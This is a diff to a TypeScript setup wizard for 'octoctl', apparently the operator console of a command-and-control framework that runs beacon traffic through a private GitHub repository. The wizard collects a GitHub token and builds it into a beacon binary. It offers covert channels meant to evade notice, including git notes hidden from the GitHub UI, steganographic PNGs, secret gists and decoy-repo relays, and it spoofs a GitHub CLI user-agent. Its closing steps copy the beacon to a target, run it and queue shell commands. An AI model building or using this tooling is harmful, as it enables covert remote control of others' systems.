@@ -28,33 +28,38 @@ export interface SetupState {
   envPath?: string;
 }
 
+// ── Phase 1: Credentials ─────────────────────────────────────────────────────
+
 export async function phaseCredentials(): Promise<{
   token: string;
   owner: string;
   repo: string;
 }> {
-  sectionHeader("Phase 1 / 9 — GitHub Credentials");
+  sectionHeader("1/9  GitHub Credentials");
 
-  p.log.info(`${DIM}The C2 repo is a private GitHub repository where beacon traffic flows.${RESET}`);
-  p.log.info(`${DIM}The PAT must belong to an account with access to this repo.${RESET}`);
+  p.note(
+    `Your C2 repo is a private GitHub repository where all\n` +
+    `beacon traffic flows (issues, branches, gists, etc.).\n\n` +
+    `You need a PAT from an account that can access this repo.\n` +
+    `Create one at: ${BOLD}github.com/settings/tokens/new${RESET}\n` +
+    `Required scope: ${BOLD}repo${RESET}  Optional: ${DIM}gist, codespace${RESET}`,
+    "What you'll need"
+  );
 
   const owner = await promptText({
-    message: "C2 repo owner — the GitHub username or org that owns the private C2 repo",
-    placeholder: "myorg",
+    message: "Repo owner",
+    placeholder: "your-username-or-org",
     validate: (v) => (!v.trim() ? "Required" : undefined),
   });
 
   const repo = await promptText({
-    message: "C2 repo name — the private repo where beacon issues/branches/gists live",
+    message: "Repo name",
     placeholder: "infrastructure",
     validate: (v) => (!v.trim() ? "Required" : undefined),
   });
 
-  p.log.info(`${DIM}Create a PAT at: https://github.com/settings/tokens/new${RESET}`);
-  p.log.info(`${DIM}Required scope: 'repo'. Optional: 'gist' (gist channel), 'codespace' (gRPC channel).${RESET}`);
-
   const token = await promptPassword({
-    message: `GitHub PAT for ${owner}/${repo} — must have 'repo' scope at minimum`,
+    message: `PAT with access to ${owner}/${repo}`,
     validate: (v) => {
       if (!v.trim()) return "Token is required";
       if (!v.startsWith("ghp_") && !v.startsWith("github_pat_"))
@@ -62,75 +67,86 @@ export async function phaseCredentials(): Promise<{
     },
   });
 
-  p.log.info(`Token: ${maskToken(token)}`);
+  p.log.success(`Token: ${maskToken(token)}`);
 
   return { token: token.trim(), owner: owner.trim(), repo: repo.trim() };
 }
+
+// ── Phase 2: Validate ────────────────────────────────────────────────────────
 
 export async function phaseValidate(
   token: string,
   owner: string,
   repo: string,
 ): Promise<void> {
-  sectionHeader("Phase 2 / 9 — Validating GitHub Access");
+  sectionHeader("2/9  Validating GitHub Access");
 
   const result = await withSpinner(
-    `Checking ${owner}/${repo}…`,
+    `Checking ${owner}/${repo}`,
     () => checkRepo(token, owner, repo),
   );
 
   if (result.error) {
-    p.log.error(`${RED}${result.error}${RESET}`);
+    p.log.error(result.error);
     const retry = await promptConfirm({ message: "Re-enter credentials?", initialValue: true });
     if (retry) throw new Error("RETRY_CREDENTIALS");
     process.exit(1);
   }
 
+  // Scope check
   const hasRepo = result.scopes.includes("repo");
   if (!hasRepo) {
-    p.log.warn(`${YELLOW}PAT is missing 'repo' scope — most tentacles will fail.${RESET}`);
+    p.log.warn("PAT is missing 'repo' scope — most tentacles will fail");
   } else {
-    p.log.success(`PAT scopes: ${result.scopes.join(", ")}`);
+    p.log.success(`Scopes: ${result.scopes.join(", ")}`);
   }
 
+  // Privacy check
   if (!result.private) {
-    p.log.warn(`${YELLOW}${owner}/${repo} is PUBLIC — strongly recommend making it private.${RESET}`);
+    p.log.warn(`${owner}/${repo} is PUBLIC — strongly recommend making it private`);
     const proceed = await promptConfirm({ message: "Continue anyway?", initialValue: false });
     if (!proceed) process.exit(0);
   } else {
-    p.log.success(`${owner}/${repo} is private`);
+    p.log.success("Repo is private");
   }
 
+  // Issues check
   if (!result.hasIssues) {
-    p.log.warn(`${YELLOW}Issues are disabled on ${owner}/${repo}. The issues tentacle won't work.${RESET}`);
+    p.log.warn("Issues are disabled — the issues tentacle won't work");
   } else {
-    p.log.success("Issues are enabled");
+    p.log.success("Issues enabled");
   }
 }
+
+// ── Phase 3: Keygen ──────────────────────────────────────────────────────────
 
 export async function phaseKeygen(
   token: string,
   owner: string,
   repo: string,
 ): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
-  sectionHeader("Phase 3 / 9 — Operator Keypair");
+  sectionHeader("3/9  Operator Keypair");
 
-  p.log.info(`${DIM}The operator keypair encrypts all beacon ↔ server communication.${RESET}`);
-  p.log.info(`${DIM}The secret key stays on your operator machine. The public key goes to the C2 repo.${RESET}`);
+  p.note(
+    `Generates an X25519 keypair for end-to-end encryption.\n\n` +
+    `${BOLD}Secret key${RESET} — stays on your machine (written to .env)\n` +
+    `${BOLD}Public key${RESET} — pushed to the C2 repo as a GitHub Variable`,
+    "Encryption"
+  );
 
   const existingSecret = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
   if (existingSecret) {
     const reuse = await promptConfirm({
-      message: "Existing OCTOC2_OPERATOR_SECRET detected. Reuse it?",
+      message: "Existing OCTOC2_OPERATOR_SECRET found in env. Reuse it?",
       initialValue: true,
     });
     if (reuse) {
-      p.log.info("Reusing existing operator keypair.");
-      return { operatorSecret: existingSecret, operatorPublicKey: "(existing — check MONITORING_PUBKEY)" };
+      p.log.success("Reusing existing keypair");
+      return { operatorSecret: existingSecret, operatorPublicKey: "(existing)" };
     }
   }
 
-  const kp = await withSpinner("Generating X25519 keypair…", async () => {
+  const kp = await withSpinner("Generating X25519 keypair", async () => {
     const keys = await generateOperatorKeyPair();
     return {
       secret: await bytesToBase64(keys.secretKey),
@@ -138,16 +154,19 @@ export async function phaseKeygen(
     };
   });
 
-  p.log.info(`Public key:  ${kp.public}`);
-  p.log.info(`Secret key:  ${DIM}(will be written to .env)${RESET}`);
+  p.note(
+    `Public:  ${kp.public}\n` +
+    `Secret:  ${DIM}(saved to .env — never share this)${RESET}`,
+    "Keypair generated"
+  );
 
   const pushVar = await promptConfirm({
-    message: `Push public key to MONITORING_PUBKEY variable on ${owner}/${repo}?`,
+    message: `Push public key to MONITORING_PUBKEY on ${owner}/${repo}?`,
     initialValue: true,
   });
 
   if (pushVar) {
-    await withSpinner("Setting MONITORING_PUBKEY…", async () => {
+    await withSpinner("Setting MONITORING_PUBKEY variable", async () => {
       const octokit = new Octokit({
         auth: token,
         headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
@@ -167,42 +186,52 @@ export async function phaseKeygen(
   return { operatorSecret: kp.secret, operatorPublicKey: kp.public };
 }
 
+// ── Phase 4: Auth Mode ───────────────────────────────────────────────────────
+
 export async function phaseAuthMode(): Promise<{
   authMode: "pat" | "app";
   appId?: number;
   installationId?: number;
 }> {
-  sectionHeader("Phase 4 / 9 — Beacon Authentication Mode");
-
-  p.log.info(`${DIM}This controls how the deployed beacon authenticates to GitHub.${RESET}`);
-  p.log.info(`${DIM}PAT: the token you entered earlier gets baked into the binary.${RESET}`);
-  p.log.info(`${DIM}App: short-lived tokens (1hr), private key delivered at runtime via dead-drop.${RESET}`);
+  sectionHeader("4/9  Beacon Authentication");
 
   const mode = await promptSelect<"pat" | "app">({
     message: "How should the beacon authenticate to GitHub?",
     options: [
-      { value: "pat", label: "PAT only", hint: "simpler — your PAT is baked directly into the beacon binary" },
-      { value: "app", label: "GitHub App", hint: "production — rotating 1-hour installation tokens, private key never baked" },
+      { value: "pat", label: "PAT only", hint: "your PAT is baked into the binary" },
+      { value: "app", label: "GitHub App", hint: "rotating 1hr tokens, private key delivered via dead-drop" },
     ],
   });
 
   if (mode === "pat") return { authMode: "pat" };
 
-  p.log.info(`${DIM}Create a GitHub App at: https://github.com/settings/apps/new${RESET}`);
-  p.log.info(`${DIM}Required permissions: Contents (R/W), Issues (R/W), Variables (R/W), Actions (R/W)${RESET}`);
-  p.log.info(`${DIM}After creating, install it on your C2 repo and note the IDs.${RESET}`);
+  p.note(
+    `Create a GitHub App at: ${BOLD}github.com/settings/apps/new${RESET}\n\n` +
+    `Permissions needed:\n` +
+    `  Contents     Read & Write\n` +
+    `  Issues       Read & Write\n` +
+    `  Variables    Read & Write\n` +
+    `  Actions      Read & Write\n\n` +
+    `After creating, install it on your C2 repo.\n` +
+    `The App ID is on the app settings page.\n` +
+    `The Installation ID is in the URL after installing.`,
+    "GitHub App setup"
+  );
 
   const appIdStr = await promptText({
-    message: "GitHub App ID — numeric ID from the app's settings page",
+    message: "App ID",
+    placeholder: "123456",
     validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
   });
 
   const installIdStr = await promptText({
-    message: "Installation ID — from the URL after installing the app on your C2 repo",
+    message: "Installation ID",
+    placeholder: "987654",
     validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
   });
 
-  p.log.info(`${DIM}Private key is never baked — deliver via: octoctl drop create --app-key-file <pem>${RESET}`);
+  p.log.info(`${DIM}Private key is never baked — deliver after deployment with:${RESET}`);
+  p.log.info(`${DIM}octoctl drop create --beacon <id> --app-key-file <pem>${RESET}`);
 
   return {
     authMode: "app",
@@ -211,30 +240,32 @@ export async function phaseAuthMode(): Promise<{
   };
 }
 
+// ── Phase 5: Tentacle Selection ──────────────────────────────────────────────
+
 export async function phaseTentacles(): Promise<string | undefined> {
-  sectionHeader("Phase 5 / 9 — Tentacle Priority");
+  sectionHeader("5/9  Covert Channels");
 
   const mode = await promptSelect<"auto" | "custom">({
-    message: "How should the beacon choose communication channels?",
+    message: "Channel selection strategy",
     options: [
-      { value: "auto", label: "Auto-detect", hint: "stealth-first ordering based on available env vars" },
-      { value: "custom", label: "Custom priority", hint: "choose exactly which channels and in what order" },
+      { value: "auto", label: "Auto-detect", hint: "stealth-first ordering, automatic fallback" },
+      { value: "custom", label: "Custom", hint: "pick channels and set priority order" },
     ],
   });
 
   if (mode === "auto") return undefined;
 
   const channels = await p.multiselect({
-    message: "Select tentacles (order = priority, top = first tried)",
+    message: "Select channels (top = highest priority)",
     options: [
-      { value: "notes",    label: "Notes",         hint: "refs/notes — invisible to most GitHub UI" },
-      { value: "stego",    label: "Steganography",  hint: "LSB-encoded PNG blobs in branches" },
-      { value: "gist",     label: "Gist",           hint: "secret gists — not visible in repo" },
-      { value: "branch",   label: "Branch",         hint: "file dead-drops on infra-sync branches" },
-      { value: "actions",  label: "Actions",        hint: "Variables API — only works inside GH Actions" },
-      { value: "secrets",  label: "Secrets",        hint: "Variables API ACK — out-of-band config" },
-      { value: "proxy",    label: "OctoProxy",      hint: "relay through decoy repos" },
-      { value: "issues",   label: "Issues",         hint: "encrypted issue comments — always available" },
+      { value: "notes",    label: "Notes",          hint: "refs/notes — invisible to GitHub UI" },
+      { value: "stego",    label: "Steganography",   hint: "LSB-encoded PNG in branches" },
+      { value: "gist",     label: "Gist",            hint: "secret gists — not visible in repo" },
+      { value: "branch",   label: "Branch",          hint: "file dead-drops on infra-sync branches" },
+      { value: "actions",  label: "Actions",         hint: "Variables API — only inside GH Actions" },
+      { value: "secrets",  label: "Secrets",         hint: "Variables API — out-of-band config" },
+      { value: "proxy",    label: "OctoProxy",       hint: "relay through decoy repos" },
+      { value: "issues",   label: "Issues",          hint: "encrypted comments — always available" },
     ],
   });
 
@@ -245,6 +276,8 @@ export async function phaseTentacles(): Promise<string | undefined> {
 
   return (channels as string[]).join(",");
 }
+
+// ── Phase 6: Write .env ──────────────────────────────────────────────────────
 
 export interface EnvFileInput {
   token: string;
@@ -291,17 +324,13 @@ export function generateEnvFile(input: EnvFileInput): string {
 }
 
 export async function phaseWriteEnv(state: SetupState): Promise<string> {
-  sectionHeader("Phase 6 / 9 — Write .env File");
+  sectionHeader("6/9  Environment File");
 
-  // Default to project root .env (one level up from octoctl/)
   const { resolve } = await import("node:path");
   const defaultPath = resolve(process.cwd().replace(/\/octoctl$/, ""), ".env");
 
-  p.log.info(`${DIM}The .env file stores all credentials. 'octoctl start' reads it automatically.${RESET}`);
-  p.log.info(`${DIM}It is gitignored — never committed to the repo.${RESET}`);
-
   const envPath = await promptText({
-    message: "Path to write .env file",
+    message: "Write .env to",
     initialValue: defaultPath,
     placeholder: defaultPath,
   });
@@ -311,30 +340,32 @@ export async function phaseWriteEnv(state: SetupState): Promise<string> {
   const { existsSync } = await import("node:fs");
   if (existsSync(envPath)) {
     const overwrite = await promptConfirm({
-      message: `${envPath} already exists. Overwrite?`,
+      message: `${envPath} exists. Overwrite?`,
       initialValue: false,
     });
     if (!overwrite) {
-      p.log.info("Skipped — .env not written.");
+      p.log.info("Skipped");
       return envPath;
     }
   }
 
   await Bun.write(envPath, content);
-  p.log.success(`Written to ${envPath}`);
+  p.log.success(`Saved to ${envPath}`);
   return envPath;
 }
 
+// ── Phase 7: Build Beacon ────────────────────────────────────────────────────
+
 export async function phaseBuildBeacon(state: SetupState): Promise<void> {
-  sectionHeader("Phase 7 / 9 — Build Beacon");
+  sectionHeader("7/9  Build Beacon");
 
   const build = await promptConfirm({
-    message: "Build a beacon binary now?",
+    message: "Compile a beacon binary now?",
     initialValue: true,
   });
 
   if (!build) {
-    p.log.info(`${DIM}Skipped. Build later with: octoctl build-beacon --outfile ./beacon${RESET}`);
+    p.log.info(`${DIM}Build later: octoctl build-beacon --outfile ./beacon${RESET}`);
     return;
   }
 
@@ -370,7 +401,7 @@ export async function phaseBuildBeacon(state: SetupState): Promise<void> {
     args.push("--installation-id", String(state.installationId));
   }
 
-  await withSpinner("Compiling beacon…", async () => {
+  await withSpinner("Compiling beacon", async () => {
     const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
     const proc = Bun.spawn([bunBin, ...args], {
       stdout: "pipe",
@@ -386,21 +417,21 @@ export async function phaseBuildBeacon(state: SetupState): Promise<void> {
     if (code !== 0) throw new Error(`Build failed (exit ${code})`);
   });
 
-  p.log.success(`Beacon built: ${outfile}`);
+  p.log.success(`Beacon: ${outfile}`);
 }
 
 // ── Phase 8: Install to PATH ─────────────────────────────────────────────────
 
 export async function phaseInstall(): Promise<void> {
-  sectionHeader("Phase 8 / 9 — Install octoctl to PATH");
+  sectionHeader("8/9  Install CLI");
 
   const install = await promptConfirm({
-    message: "Install octoctl to /usr/local/bin so you can run it from anywhere?",
+    message: "Add octoctl to PATH? (/usr/local/bin/octoctl)",
     initialValue: true,
   });
 
   if (!install) {
-    p.log.info(`${DIM}Skipped. Run manually with: bun run octoctl/src/index.ts <command>${RESET}`);
+    p.log.info(`${DIM}Run manually: bun run octoctl/src/index.ts <command>${RESET}`);
     return;
   }
 
@@ -413,9 +444,8 @@ export async function phaseInstall(): Promise<void> {
     writeFileSync(targetPath, scriptContent, { mode: 0o755 });
     chmodSync(targetPath, 0o755);
     p.log.success(`Installed to ${targetPath}`);
-  } catch (err) {
-    // Likely permission denied — try with sudo
-    p.log.warn(`${YELLOW}Direct write failed — trying with sudo…${RESET}`);
+  } catch {
+    p.log.warn("Permission denied — trying sudo");
     const tmpPath = `/tmp/octoctl-install-${Date.now()}`;
     const { writeFileSync } = await import("node:fs");
     writeFileSync(tmpPath, scriptContent, { mode: 0o755 });
@@ -427,35 +457,36 @@ export async function phaseInstall(): Promise<void> {
     const code = await proc.exited;
     if (code === 0) {
       Bun.spawn(["sudo", "chmod", "+x", targetPath], { stdout: "pipe", stderr: "pipe" });
-      p.log.success(`Installed to ${targetPath} (via sudo)`);
+      p.log.success(`Installed to ${targetPath}`);
     } else {
-      p.log.error(`${RED}Failed to install. You can do it manually:${RESET}`);
-      p.log.info(`echo '${scriptContent.replace(/\n/g, "\\n")}' | sudo tee ${targetPath} && sudo chmod +x ${targetPath}`);
+      p.log.error("Install failed. Run manually:");
+      p.log.info(`sudo ln -sf "${projectRoot}/octoctl/src/index.ts" ${targetPath}`);
     }
 
     try { (await import("node:fs")).unlinkSync(tmpPath); } catch {}
   }
 }
 
-// ── Phase 9: Verify ──────────────────────────────────────────────────────────
+// ── Phase 9: Done ────────────────────────────────────────────────────────────
 
 export async function phaseVerify(state: SetupState): Promise<void> {
-  sectionHeader("Phase 9 / 9 — Next Steps");
+  sectionHeader("9/9  Ready");
 
-  p.log.message(`
-  ${BOLD}Your deployment is configured.${RESET}
-
-  ${DIM}1.${RESET} Start everything:    ${GREEN}octoctl start${RESET}
-  ${DIM}2.${RESET} Deploy the beacon:   ${GREEN}scp ./beacon target:/tmp/ && ssh target '/tmp/beacon &'${RESET}
-  ${DIM}3.${RESET} Check registration:  ${GREEN}octoctl beacons${RESET}  ${DIM}(wait ~60s)${RESET}
-  ${DIM}4.${RESET} Queue first task:    ${GREEN}octoctl task <id> --kind shell --cmd "id"${RESET}
-  ${DIM}5.${RESET} Read results:        ${GREEN}octoctl results <id>${RESET}
-  ${DIM}6.${RESET} Check status:        ${GREEN}octoctl status${RESET}
-  ${DIM}7.${RESET} Stop everything:     ${GREEN}octoctl stop${RESET}`);
+  const steps = [
+    `octoctl start                           ${DIM}# launch server + dashboard${RESET}`,
+    `scp ./beacon target:/tmp/beacon         ${DIM}# deploy to target${RESET}`,
+    `ssh target '/tmp/beacon &'              ${DIM}# run beacon${RESET}`,
+    `octoctl beacons                         ${DIM}# verify registration (~60s)${RESET}`,
+    `octoctl task <id> --kind shell --cmd id ${DIM}# first task${RESET}`,
+    `octoctl results <id>                    ${DIM}# read output${RESET}`,
+  ];
 
   if (state.authMode === "app") {
-    p.log.message(`
-  ${BOLD}${YELLOW}GitHub App — deliver private key after first beacon checkin:${RESET}
-     ${GREEN}octoctl drop create --beacon <id> --app-key-file <pem>${RESET}`);
+    steps.splice(1, 0,
+      `octoctl drop create --beacon <id> \\`,
+      `  --app-key-file <pem>                  ${DIM}# deliver app private key${RESET}`,
+    );
   }
+
+  p.note(steps.join("\n"), "Next steps");
 }
